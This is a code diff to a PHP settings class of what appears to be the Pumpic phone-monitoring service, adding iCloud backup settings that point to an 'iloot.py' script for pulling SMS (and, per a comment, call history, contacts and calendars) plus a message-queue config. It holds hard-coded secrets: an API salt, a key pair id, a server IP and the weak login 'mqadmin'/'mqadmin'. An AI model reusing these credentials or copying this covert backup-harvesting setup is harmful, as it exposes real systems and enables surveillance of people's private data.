@@ -110,6 +110,18 @@ class GlobalSettings
         'domain' => 'http://media.pumpic.com/',
         'keyPairId' => 'APKAJGHJLY2FNTE5A62Q'
     );
+    protected static $icloud = array(
+        'pathIcloudBackups' => '/var/www/dump/',
+        'pathDownloadService' => '/var/www/icloud/iloot.py',
+        'backupItems' => 'sms' // "sms call_history address_book calendar"
+    );
+    protected static $queue = array(
+        'host' => '188.166.51.138',
+        'port' => 5672,
+        'user' => 'mqadmin',
+        'password' => 'mqadmin',
+        'vhost' => '/'
+    );
     protected static $apiSalt = 'RPnZJu2Qwnaz9nKQTeYnCpB8MzJzaR2J8r7dm6u4';
     protected static $fastSpringConfig = array(
         'storeId' => 'pumpic',
@@ -134,7 +146,12 @@ class GlobalSettings
         'master' => 'https://apifiles.pumpic.com:4433/api_upload.php',
         'slave' => null
     );
-
+    public static function getIcloudConfig(){
+        return self::$icloud;
+    }
+    public static function getQueueConfig(){
+        return self::$queue;
+    }
     public static function getTimeWaitForSend()
     {
         return self::$timeWaitForSend;
